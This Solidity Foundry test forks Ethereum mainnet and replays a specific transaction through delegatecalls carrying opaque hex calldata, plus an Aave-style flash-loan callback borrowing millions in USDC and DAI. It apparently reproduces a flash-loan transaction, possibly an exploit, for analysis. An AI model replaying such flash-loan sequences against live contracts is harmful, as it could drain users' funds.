// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1
// https://etherscan.io/address/0x00693A01221a5e93FB872637E3a9391Ef5F48300

struct S4 {
    address p1;
    address p2;
    uint24 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    uint160 p8;
}

struct S2 {
    address p1;
    bool p2;
    address p3;
    bool p4;
}

struct S1 {
    bytes32 p1;
    uint8 p2;
    address p3;
    address p4;
    uint256 p5;
    bytes p6;
}

struct S3 {
    uint8 p1;
    address p2;
    address p3;
    uint256 p4;
    bytes32 p5;
    uint256 p6;
    address p7;
    address p8;
    bytes p9;
}

contract X3f99 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1");
    }

    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xb7a1 = 0xb7A1Cb53D3518309f337E70E0cdF9070d627961c;

    function test() public {
        // vm.startPrank(0x00693A01221a5e93FB872637E3a9391Ef5F48300, 0x00693A01221a5e93FB872637E3a9391Ef5F48300);

        vm.createSelectFork("http://localhost:18545", 17620870); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1));

        // https://explorer.phalcon.xyz/tx/eth/0xdd7dd68cd879d07cfc2cb74606baa2a5bf18df0e3bda9f6b43f904f4f7bbdfc1
        xeab959d0();
    }

    function xeab959d0() public {
        xb7a1.delegatecall(
            hex"eab959d00000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000145e8b00c01fc1ab1cc48a8754073fc18a1fc10b200000000000000000000000000000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000006600000000000000000000000000000000000000000000000000000000000000ae00000000000000000000000000000000000000000000000000000000000000b200000000000000000000000000000000000000000000000000000000000000b600000000000000000000000000000000000000000000000000000000000000ba00000000000000000000000000000000000000000000000000000000000000be00000000000000000000000000000000000000000000000000000000000000c200000000000000000000000000000000000000000000000000000000000000c600000000000000000000000000000000000000000000000000000000000000ca00000000000000000000000000000000000000000000000000000000000000ce00000000000000000000000000000000000000000000000000000000000000d200000000000000000000000000000000000000000000000000000000000000d600000000000000000000000000000000000000000000000000000000000000da00000000000000000000000000000000000000000000000000000000000000de00000000000000000000000000000000000000000000000000000000000000e200000000000000000000000000000000000000000000000000000000000000e600000000000000000000000000000000000000000000000000000000000000ea00000000000000000000000000000000000000000000000000000000000000ee00000000000000000000000000000000000000000000000000000000000000f200000000000000000000000000000000000000000000000000000000000000f600000000000000000000000000000000000000000000000000000000000000fa00000000000000000000000000000000000000000000000000000000000000fe00000000000000000000000000000000000000000000000000000000000001020000000000000000000000000000000000000000000000000000000000000032e97f506a102d4554d9c6433d47ec3342468bfdb6b453bc3f31ebd02c5b1fcab52460cd588d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c0a9f0ad457c78f667a1e000b34ce590ee35be51949b9483a02c5b1fcab52460cd5554d9c6433d47ec3342468bfdb6b453bc3f31ebd0a9f0ad49ee2a1811d656131b85c7e60bb181f3160d2e8fa02c5b1fcab52460cd588d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c0a9f0ad4493f954e9466b57560e69c53bd0ef62aba63d3c902c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad4e9f0fe3f7e5e10cb029c252711e400a314578b8e02c5b1fcab52460cd5493f954e9466b57560e69c53bd0ef62aba63d3c90a9f0ad4f77484495281b57c8e77b952e8e9a33f30ae9d5602c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad48edfc90c8736eccad3381997e227868c43b48e2502c5b1fcab52460cd5f77484495281b57c8e77b952e8e9a33f30ae9d560a9f0ad4ab157ab543c2b48e3968d9a443dabdd51969002d02c5b1fcab52460cc9450d0b63417dff2e2bcc2bf82ab19e24121ae7d9bb0a9f0ad453636fca7ebbc7d5b849e87637e1b626f64db51002c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad201180f279b1527ce9c3f66e4db3910d2f11501c19a02c5b1fcab52460cc34fe7d783d7cf787e51b0607f805585b8a39e073d0a9f0ad435df5fcc47d60b78fffba9bad21f2cfdc980993702c5b1fcab52460cd51067b78fff191cd816181beaed15e089f073e0910a9f0ad488d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c01c6f7b15e69bea80cd4ca6c203876f7f656f78b451890bd2e8a7436b57a1fc1151ec2f4b51ec2f4550cd4ca6c203876f7f656f78b451890bd2e8a7436b57a1ec1f73f01c1f70cd4554d9c6433d47ec3342468bfdb6b453bc3f31ebd0cd49ee2a1811d656131b85c7e60bb181f3160d2e8fa1fc1f71ac5fa03d871f916c3fb8e1601c5763e0cc63521c1f73f20c1d520d435df5fcc47d60b78fffba9bad21f2cfdc980993702c5b15cf0694e0dd29ccff4d7efab660e72d3c2165ccceb00017618c9f4b3ad616fea32661500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004450ec408b701c1e41fd5c5b9e3ac1af6747ccfbef09004af1e0d8ead19036d02c5402c296d1b0cd4647cad5502e54ff20515598eea5a740af2c22f8c1ac5cb32e940c80dd4fb5d110947c6c767c6ba7429a18c1fbb4507844b20d4b9e3ac1af6747ccfbef09004af1e0d8ead19036d02c5402c296d1b0cd4afd390b02c545000896d4f518a292e0051e3d9cb15c3cabf2701c5470f3df7040ed4fb5d110947c6c767c6ba7429a18c1fbb4507844b20d49a244b8472f385bf0859e89572eb8ce42858311c02c5e0f023655b15c9d809f1016ae3525f2401cac5743c3a52704cce1f1acb1ac91b80af15232bd6e88a02c580a3324b681fc1c51fcac5743c3a52704cce1f1acb1ac91b80af15232bd6e88a02c2e01f01c2aeb11fd5c79a244b8472f385bf0859e89572eb8ce42858311c02c5806dc1587f0cc9743c3a52704cce1f1acb1ac91b80af15232bd6e88a15c9d809f1016ae3525f2402d49a244b8472f385bf0859e89572eb8ce42858311c02c5806dc1587f0cc9743c3a52704cce1f1acb1ac91b80af15232bd6e88a20d42c972105293c01da457e2cd9b0e91ca51b9da92302c5e0012f2e2817c7c6f9e3d7ea236602c9743c3a52704cce1f1acb1ac91b80af15232bd6e88a02c5e041eed62715c9d809f1016ae3525f2402d49a244b8472f385bf0859e89572eb8ce42858311c02c5e07ad9e06915c9d809f1016ae3525f2402d4b9e3ac1af6747ccfbef09004af1e0d8ead19036d02c5a0adf649280cd4647cad5502e54ff20515598eea5a740af2c22f8c1ac5cb32e940c80de8fb5d110947c6c767c6ba7429a18c1fbb4507844bb9e3ac1af6747ccfbef09004af1e0d8ead19036d02c5a0adf649280cd4afd390b02c545000896d4f518a292e0051e3d9cb15c3cabf2701c6470f3df77b3bc13b0cd7fb5d110947c6c767c6ba7429a18c1fbb4507844b7ed6e683e6ce494f6081514eb164b48992af360c01c6c520967f7aed1fc1240cd4fb5d110947c6c767c6ba7429a18c1fbb4507844b2cd4fb5d110947c6c767c6ba7429a18c1fbb4507844b37c7c6d9ff119a44f81ed8a060e019de8027999095247342e565772361f93e67c275140ac2c1df2cd230293e16aa2416ffad0e57d5ea0821e3c02401c1ab0cd404ee6efd76e73a49ceca988be32e1dccf8b1a80617c7c6f9e3d7ea236621c1041fc1e420d4215686bece282de927292adbdc24d1b8c142d1a001c6c5c01ffae55c0cd404ee6efd76e73a49ceca988be32e1dccf8b1a8060cd4647cad5502e54ff20515598eea5a740af2c22f8c1ec2c5300cd4fb5d110947c6c767c6ba7429a18c1fbb4507844b1cc4a060e0191bc6c769b056043b9f3b20d4215686bece282de927292adbdc24d1b8c142d1a001c6c5c01ffae55c0cd404ee6efd76e73a49ceca988be32e1dccf8b1a8060cd4afd390b02c545000896d4f518a292e0051e3d9cb1ec2c5300cd4fb5d110947c6c767c6ba7429a18c1fbb4507844b1cc4a060e01916c8c79288ca19f9901801c2ce3b9f3b200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005b9d7000202000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a5687002201c1a71fc18600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000833bd002201c19d200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008601a002201c13a20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a89ba002201c19a1fc1bb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a21d1002201c1f11fc1d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a42d9002201c1f91fc1d800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ab736002201c1161fc13700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a241c002201c13c1fc11d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000abb59002201c1791fc158000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013633a002201c11a15c926f70fff941daca1da0200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a115d002201c17d1fc15c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000082665002201c14520000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000abab6002201c1961fc1b7000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000015eafa002201c1da15c9e637cf3f54dd6c611a01c1fb000000000000000000000000000000000000000000000000000000000000000000000000000000000000155407002201c12715c91bca32c2a920919ce701c106000000000000000000000000000000000000000000000000000000000000000000000000000000000000151425002201c10515c939e810e08b02b3bec501c124000000000000000000000000000000000000000000000000000000000000000000000000000000000000156d95002201c1b515c98958a0503bb2030e7501c194000000000000000000000000000000000000000000000000000000000000000000000000000000000000152e6f002201c14f15c973a25aaac148f9f48f01c16e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000a6499002201c1b91fc198000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013af48002201c16815c954857d8de66fded3a802000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f32c000202000000000000000000000000000000000000000000000000000000"
        );
    }

    function x56b94da2() public {
        xb7a1.delegatecall(
            hex"56b94da20000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000032e97f506a102d4554d9c6433d47ec3342468bfdb6b453bc3f31ebd02c5b1fcab52460cd588d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c0a9f0ad457c78f667a1e000b34ce590ee35be51949b9483a02c5b1fcab52460cd5554d9c6433d47ec3342468bfdb6b453bc3f31ebd0a9f0ad49ee2a1811d656131b85c7e60bb181f3160d2e8fa02c5b1fcab52460cd588d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c0a9f0ad4493f954e9466b57560e69c53bd0ef62aba63d3c902c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad4e9f0fe3f7e5e10cb029c252711e400a314578b8e02c5b1fcab52460cd5493f954e9466b57560e69c53bd0ef62aba63d3c90a9f0ad4f77484495281b57c8e77b952e8e9a33f30ae9d5602c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad48edfc90c8736eccad3381997e227868c43b48e2502c5b1fcab52460cd5f77484495281b57c8e77b952e8e9a33f30ae9d560a9f0ad4ab157ab543c2b48e3968d9a443dabdd51969002d02c5b1fcab52460cc9450d0b63417dff2e2bcc2bf82ab19e24121ae7d9bb0a9f0ad453636fca7ebbc7d5b849e87637e1b626f64db51002c5b1fcab52460cd5ab157ab543c2b48e3968d9a443dabdd51969002d0a9f0ad201180f279b1527ce9c3f66e4db3910d2f11501c19a02c5b1fcab52460cc34fe7d783d7cf787e51b0607f805585b8a39e073d0a9f0ad435df5fcc47d60b78fffba9bad21f2cfdc980993702c5b1fcab52460cd51067b78fff191cd816181beaed15e089f073e0910a9f0ad488d29d2bc7454dfe8fc1a1359e2f3cbf9c28325c01c6f7b15e69bea80cd4ca6c203876f7f656f78b451890bd2e8a7436b57a1fc1151ec2f4b51ec2f4550cd4ca6c203876f7f656f78b451890bd2e8a7436b57a1ec1f73f01c1f70cd4554d9c6433d47ec3342468bfdb6b453bc3f31ebd0cd49ee2a1811d656131b85c7e60bb181f3160d2e8fa1fc1f71ac5fa03d871f916c3fb8e1601c5763e0cc63521c1f73f20c1d520d435df5fcc47d60b78fffba9bad21f2cfdc980993702c5b15cf0694e0dd29ccff4d7efab660e72d3c2165ccceb00017618c9f4b3ad616fea326615000000000000000000000000000000000000"
        );
    }

    function executeOperation(address[] memory, uint256[] memory, uint256[] memory, address, bytes memory) public {
        address[] memory arr10 = new address[](2);
        arr10[0] = xa0b8;
        arr10[1] = x6b17;
        uint256[] memory arr11 = new uint256[](2);
        arr11[0] = 17550000000000;
        arr11[1] = 17510000000000000000000000;
        uint256[] memory arr12 = new uint256[](2);
        arr12[0] = 15795000000;
        arr12[1] = 15759000000000000000000;
        bytes memory b04 = abi.encode(0);
        xb7a1.delegatecall(
            abi.encodeWithSignature(
                "executeOperation(address[],uint256[],uint256[],address,bytes)", arr10, arr11, arr12, r, b04
            )
        );

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x56b94da2) {
            x56b94da2();
            return;
        }
        revert("no such function");
    }
}
